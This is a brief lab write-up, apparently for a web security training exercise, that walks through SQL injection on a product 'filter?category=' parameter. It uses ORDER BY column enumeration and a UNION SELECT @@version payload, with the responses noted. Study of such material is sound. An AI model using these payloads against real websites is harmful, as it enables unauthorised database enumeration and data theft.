#### As usual, we start off with a column enumeration

```
/filter?category=Pets' ORDER BY 1-- -                                   #200 OK
/filter?category=Pets' ORDER BY 2-- -                                   #200 OK
/filter?category=Pets' ORDER BY 3-- -                                   #Error response 
```

#### Now that we know there are two columns, we do db version enumeration with @@verion

```
/filter?category=Pets' union select @@version,null-- -
```




### Results
![image](https://user-images.githubusercontent.com/86168235/125516268-64458389-2444-480e-8183-602748c52589.png)
